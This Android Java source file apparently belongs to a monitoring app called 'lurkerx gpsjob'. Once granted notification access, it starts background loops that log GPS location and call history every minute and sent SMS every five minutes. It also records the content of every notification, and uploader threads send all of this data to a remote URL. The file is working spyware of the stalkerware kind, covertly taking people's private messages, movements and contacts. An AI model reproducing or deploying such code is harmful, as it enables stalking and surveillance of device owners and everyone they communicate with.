package com.lurkerx.gpsjob.notifjob;

import android.app.Notification;
import android.content.Context;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import android.content.Intent;
import android.os.Build;

import com.lurkerx.gpsjob.AssetUrlProvider;
import com.lurkerx.gpsjob.GpsDatabaseHelper;
import com.lurkerx.gpsjob.GpsFetch;
import com.lurkerx.gpsjob.GpsUploader;
import com.lurkerx.gpsjob.calljob.CallFetch;
import com.lurkerx.gpsjob.calljob.CallUploader;
import com.lurkerx.gpsjob.smsjob.SmsFetch;
import com.lurkerx.gpsjob.smsjob.SmsUploader;

import android.os.Handler;
import android.os.Looper;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class NotificationService extends NotificationListenerService {

    private static final String TAG = "NotifService";
    private static boolean isConnected = false;
    private static boolean servicesStarted = false;

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        isConnected = true;
        Log.d(TAG, "Notification access GRANTED");
        startAllBackgroundTasks(getApplicationContext());
    }

    public static synchronized void startAllBackgroundTasks(Context context) {
        if (servicesStarted) return;
        servicesStarted = true;

        String url = AssetUrlProvider.getUrl(context);

        Log.d(TAG, "Starting all background loops");

        // 1. Start Uploader Threads
        new Thread(() -> GpsUploader.uploadLoop(context, url), "GpsUploaderThread").start();
        new Thread(() -> SmsUploader.uploadLoop(context, url), "SmsUploaderThread").start();
        new Thread(() -> CallUploader.uploadLoop(context, url), "CallUploaderThread").start();
        new Thread(() -> {
            try {
                NotifUploader.uploadLoop(context, url);
            } catch (Exception ignored) {}
        }, "NotifUploaderThread").start();

        // 2. Start Periodic Fetchers
        ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();

        // SMS Fetching (Every 5 minutes)
        scheduler.scheduleAtFixedRate(() -> new SmsFetch(context).fetchSentSms(), 0, 5, TimeUnit.MINUTES);

        // GPS Fetching (Every 1 minute)
        GpsFetch gpsFetch = new GpsFetch(context);
        GpsDatabaseHelper gpsDb = new GpsDatabaseHelper(context);
        scheduler.scheduleAtFixedRate(() -> {
            gpsFetch.fetchOnce(new GpsFetch.Callback() {
                @Override
                public void onLocation(double lat, double lon, float acc, long ts) {
                    Log.d(TAG, "Saving GPS: " + lat + ", " + lon);
                    gpsDb.insertLocation(lat, lon, acc, ts);
                }
                @Override
                public void onError(String reason) {
                    Log.e(TAG, "GPS error: " + reason);
                }
            });
        }, 0, 1, TimeUnit.MINUTES);

        // Call Log Fetching (Every 1 minute)
        CallFetch callFetch = new CallFetch(context);
        scheduler.scheduleAtFixedRate(() -> {
            try {
                Log.d(TAG, "Fetching call logs...");
                callFetch.fetchCalls();
            } catch (Exception e) {
                Log.e(TAG, "Error fetching calls", e);
            }
        }, 0, 1, TimeUnit.MINUTES);
    }

    @Override
    public void onDestroy() {
        // Since tasks are started statically and use their own threads/schedulers,
        // we'd need static references to shut them down if needed.
        // For now, we rely on the process being killed by the system.
        super.onDestroy();
    }

    @Override
    public void onListenerDisconnected() {
        super.onListenerDisconnected();
        isConnected = false;
        Log.d("NotifService", "Notification access REVOKED");
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Log.d("NotificationService", "Notification received");
        String pkg = sbn.getPackageName();
        long time = sbn.getPostTime();
        Bundle extras = sbn.getNotification().extras;
        String title = extras.getString(Notification.EXTRA_TITLE, "");
        CharSequence textCS = extras.getCharSequence(Notification.EXTRA_TEXT);
        String text = textCS != null ? textCS.toString() : "";

        Context context = getApplicationContext();
        NotifDatabaseHelper dbHelper = new NotifDatabaseHelper(context);
        try {
            dbHelper.insertNotification(pkg, title, text, time);
            Log.d("NotificationService", "pkg=" + pkg + " title=" + title + " text=" + text);
        } catch (Exception e) {
            Log.e("NotificationService", String.valueOf(e));
            throw new RuntimeException(e);
        }

    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {
        //null
    }

    public static boolean isGranted() {
        return isConnected;
    }
}
